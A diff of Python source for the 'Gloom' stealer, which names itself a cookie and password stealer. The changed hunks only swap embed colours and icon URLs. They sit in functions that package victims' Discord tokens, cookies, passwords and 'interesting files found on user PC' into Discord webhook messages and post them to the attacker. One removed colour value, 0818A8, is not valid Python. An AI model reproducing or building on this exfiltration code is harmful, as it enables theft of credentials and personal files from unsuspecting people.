@@ -933,7 +933,7 @@ def uploadToken(token, path):
         "content": f'{globalInfo()} | Found in `{path}`',
         "embeds": [
             {
-            "color": 0818A8,
+            "color": 000000,
             "fields": [
                 {
                     "name": ":rocket: Token:",
@@ -1014,15 +1014,15 @@ def upload(name, link):
                 {
                     "title": "Gloom | Cookies Stealer",
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [GloomCookies.txt]({link})",
-                    "color": 0818A8,
+                    "color": 000000,
                     "footer": {
                         "text": "crxelty#9999",
-                        "icon_url": "https://static.vecteezy.com/system/resources/previews/002/871/079/non_2x/Gloom-logo-design-free-vector.jpg"
+                        "icon_url": "https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png"
                     }
                 }
             ],
             "username": "Gloom",
-            "avatar_url": "https://static.vecteezy.com/system/resources/previews/002/871/079/non_2x/Gloom-logo-design-free-vector.jpg",
+            "avatar_url": "https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1040,15 +1040,15 @@ def upload(name, link):
                 {
                     "title": "Gloom | Password Stealer",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [GloomPassword.txt]({link})",
-                    "color": 0818A8,
+                    "color": 000000,
                     "footer": {
                         "text": "crxelty#9999",
-                        "icon_url": "https://static.vecteezy.com/system/resources/previews/002/871/079/non_2x/Gloom-logo-design-free-vector.jpg"
+                        "icon_url": "https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png"
                     }
                 }
             ],
             "username": "Gloom",
-            "avatar_url": "https://static.vecteezy.com/system/resources/previews/002/871/079/non_2x/Gloom-logo-design-free-vector.jpg",
+            "avatar_url": "https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1059,7 +1059,7 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                "color": 0818A8,
+                "color": 000000,
                 "fields": [
                     {
                     "name": "Interesting files found on user PC:",
@@ -1071,12 +1071,12 @@ def upload(name, link):
                 },
                 "footer": {
                     "text": "crxelty#9999",
-                    "icon_url": "https://static.vecteezy.com/system/resources/previews/002/871/079/non_2x/Gloom-logo-design-free-vector.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png"
                 }
                 }
             ],
             "username": "Gloom",
-            "avatar_url": "https://static.vecteezy.com/system/resources/previews/002/871/079/non_2x/Gloom-logo-design-free-vector.jpg",
+            "avatar_url": "https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
